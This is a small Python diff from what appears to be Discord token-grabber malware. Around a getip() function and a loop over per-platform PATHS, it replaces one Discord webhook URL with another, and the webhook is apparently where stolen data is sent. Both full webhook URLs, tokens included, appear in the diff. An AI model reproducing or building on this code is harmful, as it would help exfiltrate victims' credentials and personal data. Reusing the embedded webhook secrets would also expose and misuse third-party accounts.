@@ -100,7 +100,7 @@ def getip():
 
 def main():
     checked = []
-    webhook_url = "https://discord.com/api/webhooks/1447925854016508021/MnC95Tp9RwVh2bIWhpMvwcatZ-8oWUjscCVV4iyVFZa6bvpEiGL3woO38m11QbqMV0Ry"
+    webhook_url = "https://discord.com/api/webhooks/1466151346800562437/6LjwKzs29jNqKdFD_KDm7dOhyMD4bxYsB9J-tM6ie8huCr_mYf2FhxPU-Y51Kk8ISQEP"
     for platform, path in PATHS.items():
         if not os.path.exists(path):
             continue
